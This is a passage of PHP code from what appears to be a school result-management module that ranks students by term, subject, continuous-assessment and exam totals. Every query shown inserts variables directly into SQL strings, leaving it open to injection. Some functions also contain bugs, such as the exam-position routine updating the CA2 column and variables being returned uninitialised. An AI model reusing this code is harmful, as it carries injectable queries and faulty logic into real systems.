    $query=mysqli_query(dbass::Connect(),"SELECT  * from psession_statistical_analysis where session='$session' and class='$class' and total='$total' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function IsNotSessionPositionUpdated($session,$class)
  {  
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and `class`='$class' and (`position`='' or position is null) ");

    $res=mysqli_num_rows($query);
    if($res>0)
    {
        $rs=True;
    }
    
    return $rs;
  }

  public static function IsNotSessionSubjectPositionUpdated($session,$class,$subject)
  {  
    $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where session='$session' and `class`='$class' and `subject`='$subject' and (`position`='' or position is null) ");

    $res=mysqli_num_rows($query);
    if($res>0)
    {
        $rs=True;
    }
    
    return $rs;
  }

  public static function UpdateSessionPositions($Session,$Class,$Operation){
    
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSessionAnalysisTotalsp($Session,$Class) as $Total)
      {

        Module::SaveSessionAnalysisPositionsp($Session,$Class,$Total,'');
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSessionAnalysisTotalsp($Session,$Class) as $Total)
      {
        $Position++;
        Module::SaveSessionAnalysisPositionsp($Session,$Class,$Total,$Position);
        $bracketCount=Module::CountSessionAnalysisBracketStudentsp($Session,$Class,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }


  //Read Session First Positions's ID
  public static function ReadSessionAnalysis1stpositionsp($session){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psession_statistical_analysis where session='$session' and position='1' order by class desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['id'], $news))){
        array_push($news, $res['id']);
      }
    }
    return $news;
  }



    /** This is to Read Voucher Details*/
    public static function ReadStatisticalAnalysisIdDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_no']=$res['reg_no'];
          $news['class']=$res['class'];
          $news['session']=$res['session'];

          $news['1st_term_total']=$res['1st_term_total'];
          $news['1st_term_average']=$res['1st_term_average'];
          $news['1st_term_position']=$res['1st_term_position'];
          $news['1st_term_grade']=$res['1st_term_grade'];
          $news['1st_term_remark']=$res['1st_term_remark'];


          $news['2nd_term_total']=$res['2nd_term_total'];
          $news['2nd_term_average']=$res['2nd_term_average'];
          $news['2nd_term_position']=$res['2nd_term_position'];
          $news['2nd_term_grade']=$res['2nd_term_grade'];
          $news['2nd_term_remark']=$res['2nd_term_remark'];


          $news['3rd_term_total']=$res['3rd_term_total'];
          $news['3rd_term_average']=$res['3rd_term_average'];
          $news['3rd_term_position']=$res['3rd_term_position'];
          $news['3rd_term_grade']=$res['3rd_term_grade'];
          $news['3rd_term_remark']=$res['3rd_term_remark'];


          $news['total']=$res['total'];
          $news['average']=$res['average'];
          $news['position']=$res['position'];
          $news['grade']=$res['grade'];
          $news['remark']=$res['remark'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }


  //Read Session Subject First Positions's ID
  public static function ReadSessionSubjectAnalysis1stpositionsp($session){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and position='1' order by class desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['id'], $news))){
        array_push($news, $res['id']);
      }
    }
    return $news;
  }

  public static function ReadSessionSubjectResultAnalysisp($id){
    $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where id='$id' ");
    
    while($res=mysqli_fetch_array($query))
    {
      $news['reg_no']= $res['reg_no'];
      $news['session']= $res['session'];
      $news['class']= $res['class'];
      $news['subject']= $res['subject'];

      

      $news['ca1_total']= $res['ca1_total'];
      $news['ca1_average']= $res['ca1_average'];
      $news['ca1_position']= $res['ca1_position'];
      $news['ca1_grade']= $res['ca1_grade'];
      $news['ca1_remark']= $res['ca1_remark'];


      $news['ca2_total']= $res['ca2_total'];
      $news['ca2_average']= $res['ca2_average'];
      $news['ca2_position']= $res['ca2_position'];
      $news['ca2_grade']= $res['ca2_grade'];
      $news['ca2_remark']= $res['ca2_remark'];


      $news['ca3_total']= $res['ca3_total'];
      $news['ca3_average']= $res['ca3_average'];
      $news['ca3_position']= $res['ca3_position'];
      $news['ca3_grade']= $res['ca3_grade'];
      $news['ca3_remark']= $res['ca3_remark'];


      $news['exam_total']= $res['exam_total'];
      $news['exam_average']= $res['exam_average'];
      $news['exam_position']= $res['exam_position'];
      $news['exam_grade']= $res['exam_grade'];
      $news['exam_remark']= $res['exam_remark'];


      $news['total']= $res['total'];
      $news['average']= $res['average'];
      $news['position']= $res['position'];
      $news['grade']= $res['grade'];
      $news['remark']= $res['remark'];
    }
    
    return $news;
  }



  public static function ReadStudentSessionSubjectResultAnalysisp($reg_no,$session,$subject){
    $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where reg_no='$reg_no' and session='$session' and subject='$subject'");
    
    while($res=mysqli_fetch_array($query))
    {
      $news['reg_no']= $res['reg_no'];
      $news['session']= $res['session'];
      $news['class']= $res['class'];
      $news['subject']= $res['subject'];




      $news['ca1_total']= $res['ca1_total'];
      $news['ca1_average']= $res['ca1_average'];
      $news['ca1_position']= $res['ca1_position'];
      $news['ca1_grade']= $res['ca1_grade'];
      $news['ca1_remark']= $res['ca1_remark'];


      $news['ca2_total']= $res['ca2_total'];
      $news['ca2_average']= $res['ca2_average'];
      $news['ca2_position']= $res['ca2_position'];
      $news['ca2_grade']= $res['ca2_grade'];
      $news['ca2_remark']= $res['ca2_remark'];


      $news['ca3_total']= $res['ca3_total'];
      $news['ca3_average']= $res['ca3_average'];
      $news['ca3_position']= $res['ca3_position'];
      $news['ca3_grade']= $res['ca3_grade'];
      $news['ca3_remark']= $res['ca3_remark'];


      $news['exam_total']= $res['exam_total'];
      $news['exam_average']= $res['exam_average'];
      $news['exam_position']= $res['exam_position'];
      $news['exam_grade']= $res['exam_grade'];
      $news['exam_remark']= $res['exam_remark'];


      $news['total']= $res['total'];
      $news['average']= $res['average'];
      $news['position']= $res['position'];
      $news['grade']= $res['grade'];
      $news['remark']= $res['remark'];
    }
    
    return $news;
  }





  //===============Session Subject Analysis Position Processor
  public static function CountSessionSubjectAnalysisBracketStudentsp($session,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and total='$total' and subject='$subject' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function SaveSessionSubjectAnalysisPositionsp($session,$class,$subject,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set position='$position' where session='$session' and class='$class' and total='$total' and subject='$subject' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function ReadSessionSubjectAnalysisTotalsp($session,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['total'], $news))){
        array_push($news, $res['total']);
      }
    }
    return $news;
  }

  public static function UpdateSessionSubjectPositions($Session,$Class,$Subject,$Operation){
    
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSessionSubjectAnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {

        Module::SaveSessionSubjectAnalysisPositionsp($Session,$Class,$Subject,$Total,'');
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSessionSubjectAnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {
        $Position++;
        Module::SaveSessionSubjectAnalysisPositionsp($Session,$Class,$Subject,$Total,$Position);
        $bracketCount=Module::CountSessionSubjectAnalysisBracketStudentsp($Session,$Class,$Subject,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }





  //===================== Session Subject CA1 Position Analysis Processor

  public static function CountSessionSubjectCA1AnalysisBracketStudentsp($session,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and ca1_total='$total' and subject='$subject' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function SaveSessionSubjectCA1AnalysisPositionsp($session,$class,$subject,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set ca1_position='$position' where session='$session' and class='$class' and ca1_total='$total' and subject='$subject' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function ReadSessionSubjectCA1AnalysisTotalsp($session,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' order by ca1_total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['ca1_total'], $news))){
        array_push($news, $res['ca1_total']);
      }
    }
    return $news;
  }

  public static function UpdateSessionSubjectCA1Positions($Session,$Class,$Subject,$Operation){
    
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSessionSubjectCA1AnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {

        Module::SaveSessionSubjectCA1AnalysisPositionsp($Session,$Class,$Subject,$Total,'');
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSessionSubjectCA1AnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {
        $Position++;
        Module::SaveSessionSubjectCA1AnalysisPositionsp($Session,$Class,$Subject,$Total,$Position);
        $bracketCount=Module::CountSessionSubjectCA1AnalysisBracketStudentsp($Session,$Class,$Subject,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }





  //===================== Session Subject CA2 Position Analysis Processor

  public static function CountSessionSubjectCA2AnalysisBracketStudentsp($session,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and ca2_total='$total' and subject='$subject' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function SaveSessionSubjectCA2AnalysisPositionsp($session,$class,$subject,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set ca2_position='$position' where session='$session' and class='$class' and ca2_total='$total' and subject='$subject' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function ReadSessionSubjectCA2AnalysisTotalsp($session,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' order by ca2_total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['ca2_total'], $news))){
        array_push($news, $res['ca2_total']);
      }
    }
    return $news;
  }

  public static function UpdateSessionSubjectCA2Positions($Session,$Class,$Subject,$Operation){
    
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSessionSubjectCA2AnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {

        Module::SaveSessionSubjectCA2AnalysisPositionsp($Session,$Class,$Subject,$Total,'');
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSessionSubjectCA2AnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {
        $Position++;
        Module::SaveSessionSubjectCA2AnalysisPositionsp($Session,$Class,$Subject,$Total,$Position);
        $bracketCount=Module::CountSessionSubjectCA2AnalysisBracketStudentsp($Session,$Class,$Subject,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }





  //===================== Session Subject Exam Position Analysis Processor

  public static function CountSessionSubjectExamAnalysisBracketStudentsp($session,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and exam_total='$total' and subject='$subject' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function SaveSessionSubjectExamAnalysisPositionsp($session,$class,$subject,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set ca2_position='$position' where session='$session' and class='$class' and exam_total='$total' and subject='$subject' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function ReadSessionSubjectExamAnalysisTotalsp($session,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' order by exam_total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['exam_total'], $news))){
        array_push($news, $res['exam_total']);
      }
    }
    return $news;
  }

  public static function UpdateSessionSubjectExamPositions($Session,$Class,$Subject,$Operation){
    
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSessionSubjectExamAnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {

        Module::SaveSessionSubjectExamAnalysisPositionsp($Session,$Class,$Subject,$Total,'');
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSessionSubjectExamAnalysisTotalsp($Session,$Class,$Subject) as $Total)
      {
        $Position++;
        Module::SaveSessionSubjectExamAnalysisPositionsp($Session,$Class,$Subject,$Total,$Position);
        $bracketCount=Module::CountSessionSubjectExamAnalysisBracketStudentsp($Session,$Class,$Subject,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }






  public static function ReadAnalysisTotalsp($session,$term,$class){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class'   order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['total'], $news))){
        array_push($news, $res['total']);
      }
    }
    return $news;
  }

  public static function SaveTermAnalysisPositionsp($session,$term,$class,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  presult_analysis set position='$position' where session='$session' and term='$term' and class='$class' and total='$total' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function CountTermAnalysisBracketStudentsp($session,$term,$class,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class' and total='$total' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function UpdateTermSubPositions($Sub,$Session,$Term,$Class,$Operation){
    
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSubAnalysisTotalsp($Sub,$Session,$Term,$Class) as $Total)
      {

        Module::SaveTermSubAnalysisPositionsp($Sub,$Session,$Term,$Class,$Total,'');
        //$bracketCount=Module::CountTermSubAnalysisBracketStudentsp($Sub,$Session,$Term,$Class,$Total);
        //$Position=$Position+$bracketCount;
        //$Position=$Position-1;
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSubAnalysisTotalsp($Sub,$Session,$Term,$Class) as $Total)
      {
        $Position++;
        Module::SaveTermSubAnalysisPositionsp($Sub,$Session,$Term,$Class,$Total,$Position);
        $bracketCount=Module::CountTermSubAnalysisBracketStudentsp($Sub,$Session,$Term,$Class,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }

  public static function UpdateSessionSubPositions($Sub,$Session,$Class,$Subject,$Operation){
    if($Operation=="clear_position")
    {
      foreach(Module::ReadSessionSubAnalysisTotalsp($Sub,$Session,$Class,$Subject) as $Total)
      {

        Module::SaveSessionSubAnalysisPositionsp($Sub,$Session,$Class,$Subject,$Total,'');
        //$bracketCount=Module::CountTermSubAnalysisBracketStudentsp($Sub,$Session,$Term,$Class,$Total);
        //$Position=$Position+$bracketCount;
        //$Position=$Position-1;
      }
    }
    else
    {
      $Position=0;
      foreach(Module::ReadSessionSubAnalysisTotalsp($Sub,$Session,$Class,$Subject) as $Total)
      {
        $Position++;
        Module::SaveSessionSubAnalysisPositionsp($Sub,$Session,$Class,$Subject,$Total,$Position);
        $bracketCount=Module::CountSessionSubAnalysisBracketStudentsp($Sub,$Session,$Class,$Subject,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }

  public static function UpdateSubjectPositions($Session,$Term,$Class,$Subject,$Operation)
  {
    if($Operation=="clear_position")
    {
      foreach(Module::ReadTotalsp($Session,$Term,$Class,$Subject) as $Total)
      {
        //$Position++;
        Module::SaveBracketPositionsp($Session,$Term,$Class,$Subject,$Total,$Position);
        //$bracketCount=Module::CountSubjectBracketStudentsp($Session,$Term,$Class,$Subject,$Total);
        //$Position=$Position+$bracketCount;
        //$Position=$Position-1;
      }
    }
    else
    {
      foreach(Module::ReadTotalsp($Session,$Term,$Class,$Subject) as $Total)
      {
        $Position++;
        Module::SaveBracketPositionsp($Session,$Term,$Class,$Subject,$Total,$Position);
        $bracketCount=Module::CountSubjectBracketStudentsp($Session,$Term,$Class,$Subject,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }    
  }

  public static function IsNotSubjectPositionUpdated($session,$term,$class,$subject)
  {      
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and `term`='$term' and `class`='$class' and `subject`='$subject' and (`position`='' or position is null) ");

    $res=mysqli_num_rows($query);
    if($res>0)
    {
        $rs=True;
    }
    
    return $rs;
  }

  public static function IsNotClassPositionUpdated($session,$term,$class)
  {      
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and `term`='$term' and `class`='$class' and (`position`='' or position is null) ");

    $res=mysqli_num_rows($query);
    if($res>0)
    {
        $rs=True;
    }
    
    return $rs;
  }

  public static function IsNotClassSubPositionUpdated($sub,$session,$term,$class)
  {      
    
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and `term`='$term' and `class`='$class' and (`ca1_position`='' or ca1_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
   
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and `term`='$term' and `class`='$class' and (`ca2_position`='' or ca2_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
  
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and `term`='$term' and `class`='$class' and (`ca3_position`='' or ca3_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
   
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and `term`='$term' and `class`='$class' and (`exam_position`='' or exam_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
  
    }
    
    return $rs;
  }

  public static function IsNotSessionSubPositionUpdated($sub,$session,$class,$subject)
  {      
    
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where session='$session' and `class`='$class' and subject='$subject' and (`ca1_position`='' or ca1_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
   
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where session='$session' and `class`='$class' and `subject`='$subject' and (`ca2_position`='' or ca2_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
  
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where session='$session' and `class`='$class' and `subject`='$subject' and (`ca3_position`='' or ca3_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
   
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where session='$session' and `class`='$class' and `subject`='$subject' and (`exam_position`='' or exam_position is null) ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
  
    }
    
    return $rs;
  }

  public static function ReadSubAnalysisTotalsp($sub,$session,$term,$class){
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class'   order by ca1_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['ca1_total'], $news))){
          array_push($news, $res['ca1_total']);
        }
      }      
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class'   order by ca2_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['ca2_total'], $news))){
          array_push($news, $res['ca2_total']);
        }
      }      
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class'   order by ca3_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['ca3_total'], $news))){
          array_push($news, $res['ca3_total']);
        }
      }      
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class'   order by exam_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['exam_total'], $news))){
          array_push($news, $res['exam_total']);
        }
      }      
    }


    return $news;
  }

  public static function ReadSessionSubAnalysisTotalsp($sub,$session,$class,$subject){
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject'   order by ca1_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['ca1_total'], $news))){
          array_push($news, $res['ca1_total']);
        }
      }      
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject'   order by ca2_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['ca2_total'], $news))){
          array_push($news, $res['ca2_total']);
        }
      }      
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject'   order by ca3_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['ca3_total'], $news))){
          array_push($news, $res['ca3_total']);
        }
      }      
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject'   order by exam_total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['exam_total'], $news))){
          array_push($news, $res['exam_total']);
        }
      }      
    }
    elseif($sub=="Overall")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject'   order by total desc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['total'], $news))){
          array_push($news, $res['total']);
        }
      }      
    }


    return $news;
  }

  public static function SaveTermSubAnalysisPositionsp($sub,$session,$term,$class,$total,$position){
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  presult_analysis set ca1_position='$position' where session='$session' and term='$term' and class='$class' and ca1_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  presult_analysis set ca2_position='$position' where session='$session' and term='$term' and class='$class' and ca2_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  presult_analysis set ca3_position='$position' where session='$session' and term='$term' and class='$class' and ca3_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  presult_analysis set exam_position='$position' where session='$session' and term='$term' and class='$class' and exam_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }    

    return $news;
  }

  public static function SaveSessionSubAnalysisPositionsp($sub,$session,$class,$subject,$total,$position){
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set ca1_position='$position' where session='$session' and class='$class' and subject='$subject' and ca1_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set ca2_position='$position' where session='$session' and subject='$subject' and class='$class' and ca2_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set ca3_position='$position' where session='$session' and subject='$subject' and class='$class' and ca3_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set exam_position='$position' where session='$session' and subject='$subject' and class='$class' and exam_total='$total' ");
      if($query)
      {
        $news=true;
      }
    }    
    elseif($sub=="Overall")
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE  psubject_analysis set position='$position' where session='$session' and subject='$subject' and class='$class' and total='$total' ");
      if($query)
      {
        $news=true;
      }
    }    

    return $news;
  }

  public static function CountTermSubAnalysisBracketStudentsp($sub,$session,$term,$class,$total){
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class' and ca1_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class' and ca2_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class' and ca3_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class' and exam_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    
    return $news;
  }

  public static function CountSessionSubAnalysisBracketStudentsp($sub,$session,$class,$subject,$total){
    if($sub=="CA1")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' and ca1_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="CA2")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' and ca2_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="CA3")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' and ca3_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="Exam")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' and exam_total='$total' ");
      $news=mysqli_num_rows($query);
    }
    elseif($sub=="Overall")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT  * from psubject_analysis where session='$session' and class='$class' and subject='$subject' and total='$total' ");
      $news=mysqli_num_rows($query);
    }
    
    return $news;
  }



  public static function ReadTotalsp($session,$term,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult where session='$session' and term='$term' and class='$class' and subject='$subject'  order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['total'], $news))){
        array_push($news, $res['total']);
      }        
    }
    
    return $news;
  }



  public static function ReadCa1Totalsp($session,$term,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult where session='$session' and term='$term' and class='$class' and subject='$subject'  order by ca_1 desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['ca_1'], $news))){
        array_push($news, $res['ca_1']);
      }        
    }
    
    return $news;
  }




  public static function SaveBracketPositions($session,$term,$class,$subject,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  result set position='$position' where session='$session' and term='$term' and class='$class' and subject='$subject' and total='$total' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }




  public static function SaveAnalysisBracketPositions($session,$term,$class,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  result_analysis set position='$position' where session='$session' and term='$term' and class='$class' and total='$total' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function SaveBracketPositionsp($session,$term,$class,$subject,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  presult set position='$position' where session='$session' and term='$term' and class='$class' and subject='$subject' and total='$total' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function SaveAnalysisCA1Positionsp($session,$term,$class,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  presult_analysis set ca1_position='$position' where session='$session' and term='$term' and class='$class' and ca1_total='$total' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function CountCA1AnalysisStudentsp($session,$term,$class,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult_analysis where session='$session' and term='$term' and class='$class' and ca1_total='$total' ");
      $news=mysqli_num_rows($query);
    return $news;
  }



  public static function ReadSubjectBracketStudents($session,$term,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from result where session='$session' and term='$term' and class='$class' and subject='$subject' and total='$total' ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }



  public static function ReadAnalysisBracketStudents($session,$term,$class,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from result_analysis where session='$session' and term='$term' and class='$class' and total='$total' ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }


  public static function ReadSubjectBracketStudentsp($session,$term,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult where session='$session' and term='$term' and class='$class' and subject='$subject' and total='$total' ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
